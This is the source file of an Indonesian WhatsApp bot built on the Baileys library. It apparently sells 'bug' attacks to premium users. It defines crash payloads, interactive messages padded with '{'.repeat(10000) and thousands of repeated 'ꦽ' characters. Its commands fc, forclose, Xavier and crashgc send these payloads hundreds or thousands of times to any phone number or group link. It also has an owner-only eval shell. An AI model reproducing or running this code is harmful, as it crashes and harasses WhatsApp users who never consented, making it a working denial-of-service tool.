require('./settings');
const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const {
    spawn,
    exec,
    execSync
} = require('child_process');
const {
    default: makeWASocket,
    prepareWAMessageMedia,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeInMemoryStore,
    generateWAMessageFromContent,
    generateWAMessageContent,
    jidDecode,
    proto,
    relayWAMessage,
    getContentType,
    getAggregateVotesInPollMessage,
    downloadContentFromMessage,
    fetchLatestWaWebVersion,
    InteractiveMessage,
    makeCacheableSignalKeyStore,
    Browsers,
    generateForwardMessageContent,
    MessageRetryMap
} = require("@whiskeysockets/baileys");

module.exports = ade = async (ade, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
        );

        const sender = m.key.fromMe ?
            ade.user.id.split(":")[0] || ade.user.id :
            m.key.participant || m.key.remoteJid;

        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '/';

        const isGroup = m.chat.endsWith("@g.us");
        const isNewSletter = m.chat.endsWith("@newsletter")

        const botNumber = await ade.decodeJid(ade.user.id);
        const dbOwner = JSON.parse(fs.readFileSync("./lib/DataBase/owner.json"))
        const dbPremium = JSON.parse(fs.readFileSync("./lib/DataBase/premium.json"))

        const isPremium = dbPremium.includes(m.sender)
        const isOwner = dbOwner.includes(m.sender) || m.sender === global.nowner+"@s.whatsapp.net"
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);

        const groupMetadata = isGroup ? await ade.groupMetadata(m.chat).catch((e) => {}) : "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = isGroup ? await groupMetadata.participants : "";
        const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
        const groupMembers = isGroup ? groupMetadata.participants : "";
        const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
        const isBotAdmin = isGroup ? groupAdmins.includes(botNumber) : false;
        const isOwnerAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

const qvo = {
    key: {
      remoteJid: "231210@s.whatsapp.net",
      participant: "0@s.whatsapp.net",
      fromMe: false
    },
    message: {
      imageMessage: {
      scanLengths: [ 16956, 60326, 22576, 34644 ],
      url: 'https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQOsNPXs2R4KDqEHwYMOBg6taEcJDrojh8J3xj-9xvUgUqYhDg8bqzKt4Az9eJ_9oWUpgT6iS3pRKC1M_vg9ggWOa58BP1q6-L-ZWkkWkA?ccb=9-4&oh=01_Q5Aa1gFOTulhK2B0ms3LledD4Iq3FBM3rf8wkLXcBKJEIqU7iw&oe=6859DF07&_nc_sid=e6ed6c&mms3=true',
  mimetype: 'image/jpeg',
  fileLength: 99999,
  fileSha256: "p5Rn1pdex9dmqksVQ+r2KjTgMANxpdmsRkqe26Odz8c=",
  mediaKey: "++mf8cMQzmLbMNqNNIMi4txXKoHC9Ku/7QVNEMIBleA=",
  fileEncSha256: "rO7YbUc0Kc4scwfdiivKR5ZiRZXgp2+I13eY8tEOhIM=",
  height: 1280,
  width: 1280,
  viewOnce: true,
  creator: "TGV6eiBEY29kZVIK"
      }
    }
  }
        const {
            smsg,
            sendGmail,
            formatSize,
            isUrl,
            generateMessageTag,
            getBuffer,
            getSizeMedia,
            runtime,
            fetchJson,
            sleep
        } = require('./lib/myfunc');

        const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

        if (m.message) {
            console.log(chalk.magenta.bold(`<========[ NEW MESSAGE ]========>`) + "\n" +
                chalk.white.bold(`\n\n👤 SENDER: ${m.sender} ( ${m.pushName} )\n📍 IN: ${m.isNewSletter ? "SALURAN" : m.isGroup ? "Group" : "PRIVATE"}\n✉️ MESSAGE: ${m.body || m.mtype}\n\n`)
            )
        }

async function Kaycrash2(target) {
let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "RX7",
              hasMediaAttachment: false,
            },
            body: {
              text: "RilzX7",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

  await ade.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function Kaycrash1(target) {
let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "RX7",
              hasMediaAttachment: false,
            },
            body: {
              text: "RilzX7",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
          },
        },
      },
    },
    {}
  );

  await ade.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function crashGc(teks, target) {
const buttons = [
    {
        buttonId: `.buttons1`,
        buttonText: { displayText: 'ꦽ'.repeat(1000) },
        type: 1
    },
    {
        buttonId: `.buttons2`,
        buttonText: { displayText: 'ꦽ'.repeat(1000) },
        type: 1
    }
];

const buttonMessage = {
    buttons: buttons,
    headerType: 1,
    viewOnce: true,
    text: teks
}

const flowActions = [
    {
        buttonId: 'action',
        buttonText: { displayText: 'ꦽ'.repeat(1000) },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "ꦽ".repeat(10000),
                sections: [
                    {
                        title: "ꦽ".repeat(10000),
                        rows: [
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
    {
        buttonId: 'action',
        buttonText: { displayText: 'ꦽ'.repeat(1000) },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "ꦽ".repeat(1000),
                sections: [
                    {
                        title: "ꦽ".repeat(1000),
                        rows: [
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    },
        {
        buttonId: 'action',
        buttonText: { displayText: 'ꦽ'.repeat(1000) },
        type: 4,
        nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
                title: "ꦽ".repeat(1000),
                sections: [
                    {
                        title: "ꦽ".repeat(1000),
                        rows: [
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` },
                            { title: "ꦽ".repeat(1000), id: `.rows` }
                        ]
                    }
                ]
            })
        },
        viewOnce: true
    }
]
buttonMessage.buttons.push(...flowActions)

await ade.sendMessage(target, buttonMessage, { quoted: qvo })
}

        switch (command) {
        case "menu": case "start": case "allmenu": {
let textM = `
( 䒘 ) xᴀᴠɪᴇʀ ( 䒘 )
⬡ Developer : ᴋᴀᴢʏᴇɴ
⬡ Script : xᴀᴠɪᴇʀ ᴠ 2 ɢᴇɴᴢ 1
⬡ Version : 1
⬡ Type : Case
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
( 䒘 ) ʙᴜɢ ᴍᴇɴᴜ ( 䒘 ) 
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
⬡ Xavier
⬡ bug
⬡ fc
⬡ forclose
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
( 䒘 ) sᴛᴏʀᴇ ᴍᴇɴᴜ ( 䒘 )
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
⬡ setgpay
⬡ sendpay
⬡ selpay
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
 ( 䒘 ) ᴏᴡɴᴇʀ ᴍᴇɴᴜ ( 䒘 )
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
⬡ ᴋɪᴄᴋ
⬡ ʜɪᴅᴇᴛᴀɢ
⬡ ᴛᴀɢᴀʟʟ
⬡ sᴇʟғ
⬡ ᴘᴜʙʟɪᴄᴋ
⬡ thx
⬡ cekganteng 
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈✧
`
ade.sendMessage(m.chat, {
   image: { url: "https://files.catbox.moe/zcgumd.jpg" },
  caption: textM,
  contextInfo: {
    isForwarded: true,
    externalAdReply: {
      title: "DarkWhisper",
      body: "Powered By Kyzen",
      thumbnailUrl: "https://files.catbox.moe/q611ca.jpg",
    }
  }
}, { quoted: qvo})
}
break

case "setpay": {
if (!isOwner) return m.reply(msg.owner)
let itu = text.split("|")
if (itu.length < 1) return m.reply(`Example: ${prefix+command} dana|628xxx`)
let npay = itu[0]
let pay = itu[0]
if (!["dana", "ovo", "gopay"].includes(npay)) return m.reply(`LIST PAYMENT YANG BISA ANDA SETTING: DANA, OVO, DAN GOPAY`)
global[npay] = pay
m.reply("Done ✅")
}
break

case "delpay": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(`Example: ${prefix+command} dana`)
if (!["dana", "ovo", "gopay"].includes(text)) return m.reply(`LIST PAYMENT YANG BISA ANDA HAPUS: DANA, OVO, DAN GOPAY`)
global[text] = ""
m.reply("Done ✅")
}
break

case "sendpay": {
  if (!isOwner) return m.reply(msg.owner)
  m.reply(`\`[ ! ]\` LIST PAYMENT \`[ ! ]\`
DANA: ${global.dana}
GOPAY: ${global.gopay}
OVO: ${global.ovo}`)
}
  break

case "tqto": case "thx": {
m.reply(`『 𝐓𝐡𝐚𝐧𝐤𝐬 𝐓𝐨 』\n ➩ ᴋᴀʏᴢᴇɴ ｢ ᴅᴇᴠᴇʟᴏᴘᴇʀ ｣\n➩  ᴄʜᴀᴄᴀ ｢ ᴍʏ  ʟᴏᴠᴇ ｣\n ➩ ᴋᴀɪᴢɪ ｢ sᴜᴘᴏʀᴛ｣\n ➩ ʟᴇᴢᴢ ｢ sᴜᴘᴏʀᴛ｣\n ➩ ʀɪʟᴢʏ ｢ ᴍʏ ʙʀᴏᴛʜᴇʀ｣\n ➩ ᴢᴇᴛᴢᴏ ｢ sᴜᴘᴏʀᴛ ｣\n ➩ ᴀʟʟᴀʜ sᴡᴛ ｢ ᴍʏ ɢᴏᴅ ｣\n ➩ ᴀɴᴀɴ ｢ ᴍʏ ғʀɪᴇɴᴅ｣\n ➩ ᴋʏᴀᴍɪ ｢ ᴍʏ ғʀɪᴇɴᴅ｣\n ➩ ᴄᴇʟʟᴏ ｢ ᴍʏ ғʀᴇɪɴᴅs｣\n ➩ ᴀxᴇ ｢ ᴍʏ ғʀɪᴇɴᴅ｣\n➩ ʟᴀɴɢɪᴛ ｢ ᴍʏ ғʀɪᴇɴᴅ｣\n➩ ғᴀᴅᴇʟ ｢ ᴍʏ ғʀɪᴇɴᴅ｣\n➩ ʀᴇᴘᴀɴ｢ ᴘᴀʀᴛɴᴇʀ｣\n➩ ᴀsʏ      ｢ ᴍʏ ғʀɪᴇɴᴅ ｣`)
}
break

case "cekganteng": {
if (!q) return m.reply(`Example: ${prefix+command} nama`)
let nama = q.toUpperCase()
if (nama === "KYZEN") {
m.reply(`\`[ ! ]\` HASIL CEK \`[ ! ]\`
NAMA: ${nama}
NILAI GANTENG: ∞% ( SYSTEM MENDETEKSI BAHWA ${nama} TERLALU GANTENG`)
} else {
m.reply(`\`[ ! ]\` HASIL CEK \`[ ! ]\`
NAMA: ${nama}
NILAI KEGANTENGAN: ${Math.floor(Math.random() * 100)}%`)
}
}
break

case "open": {
if (!isGroup) return m.reply(msg.group)
if (!isOwner) return m.reply(msg.owner)
if (!isBotAdmin) return m.reply("Khusus Admin, Bot Bukan Admin")
await ade.groupSettingUpdate(m.chat, "non_announcement")
m.reply("Done ✅")
}
break

case "close": {
if (!isGroup) return m.reply(msg.group)
if (!isOwner) return m.reply(msg.owner)
if (!isBotAdmin) return m.reply("Khusus Admin, Bot Bukan Admin")
await ade.groupSettingUpdate(m.chat, "announcement")
m.reply("Done ✅")
}
break

case "brat": {
  if (!text) return reply(`Ex: ${prefix + command} Aku Sayang Kamu`)
  const media = `https://brat.caliphdev.com/api/brat?text=${text}`;

  ade.sendImageAsSticker(m.chat, media, m, {
    packname: "Xavier",
    author: "Kyzen"
  });
}
break

case "fc": {
if (!isOwner && !isPremium) return m.reply(msg.premium)
if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
m.reply("Succes Sending Bug To "+target)
for (let i = 0; i < 200; i++) {
Kaycrash2(target)
Kaycrash1(target) 
}
}
break
case "forclose": {
if (!isOwner && !isPremium) return m.reply(msg.premium)
if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
m.reply("Succes Sending Bug To "+target)
for (let i = 0; i < 500; i++) {
Kaycrash2(target)
Kaycrash1(target)
}
}
break
case "Xavier": {
if (!isOwner && !isPremium) return m.reply(msg.premium)
if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)
let target = q.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
m.reply("Succes Sending Bug To "+target)
for (let i = 0; i < 1000; i++) {
Kaycrash2(target)
Kaycrash2(target)
}
}
break

case "crashgc": {
if (!isOwner) return m.reply(msg.owner)
let itunya = text.split("|")
if (itunya.length < 1) return m.reply(`Example: ${prefix + command} text|link`)
let teks = itunya[0]
let link = itunya[1]
let code = link.split('chat.whatsapp.com/')[1].trim()
let res = await ade.groupGetInviteInfo(code)
m.reply("Otw Sending Bug To "+res.id)
crashGc(teks, res.id)
}
break
            case "public": {
                if (!isOwner) return m.reply(msg.owner)
                ade.public = true
                m.reply(`*Succesfully Change To Mode Public*`)
            }
            break

            case "self": {
                if (!isOwner) return m.reply(msg.owner)
                ade.public = false
                m.reply(`*Succesfully Change To Mode Private*`)
            }
            break

            case "addowner": {
                if (!isOwner) return m.reply(msg.owner)
                if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)

                let number = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                const cekonwa = await ade.onWhatsApp(number)
                if (!cekonwa.length) return m.reply(`*${number} Tidak Terdaftar Di WhatsApp, Harap Masukan Nomor Yang Valid*`)

                if (dbPremium.includes(number)) return m.reply(`*${number} Sudah Ada Di DataBase Owner*`)

                dbOwner.push(number)
                fs.writeFileSync("./lib/DataBase/owner.json", JSON.stringify(dbOwner))
                m.reply(`*Berhasil Menambahkan ${number} Ke DataBase Owner*`)
            }
            break

            case "delowner": {
                if (!isOwner) return m.reply(msg.owner)
                if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)

                let number = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                const cekdb = dbOwner.indexOf(number)
                if (cekdb === -1) return m.reply(`${number} Tidak Ada Di DataBase`)

                dbOwner.splice(cekdb, 1)
                fs.writeFileSync("./lib/DataBase/owner.json", JSON.stringify(dbOwner))
                m.reply(`*Berhasil Menghapus ${number} Dari DataBase Owner`)
            }
            break

            case "addprem":
            case "addpremium": {
                if (!isOwner) return m.reply(msg.owner)
                if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)

                let number = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                const cekonwa = await ade.onWhatsApp(number)
                if (!cekonwa.length) return m.reply(`*${number} Tidak Terdaftar Di WhatsApp, Harap Masukan Nomor Yang Valid*`)

                if (dbPremium.includes(number)) return m.reply(`*${number} Sudah Ada Di DataBase Premium*`)

                dbPremium.push(number)
                fs.writeFileSync("./lib/DataBase/owner.json", JSON.stringify(dbPremium))
                m.reply(`*Berhasil Menambahkan ${number} Ke DataBase Owner*`)
            }
            break

            case "delprem":
            case "delpremium": {
                if (!isOwner) return m.reply(msg.owner)
                if (!q) return m.reply(`Example: ${prefix + command} 628xxx`)

                let number = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                const cekdb = dbPremium.indexOf(number)
                if (cekdb === -1) return m.reply(`${number} Tidak Ada Di DataBase`)

                dbPremium.splice(cekdb, 1)
                fs.writeFileSync("./lib/DataBase/owner.json", JSON.stringify(dbPremium))
                m.reply(`*Berhasil Menghapus ${number} Dari DataBase Premium*`)
            }
            break

            default:
                if (budy.startsWith('>')) {
                    if (!isOwner) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await m.reply(evaled);
                    } catch (err) {
                        m.reply(String(err));
                    }
                }

                if (budy.startsWith('=>')) {
                    if (!isOwner) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await m.reply(require('util').format(teks))
                    }
                }

        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})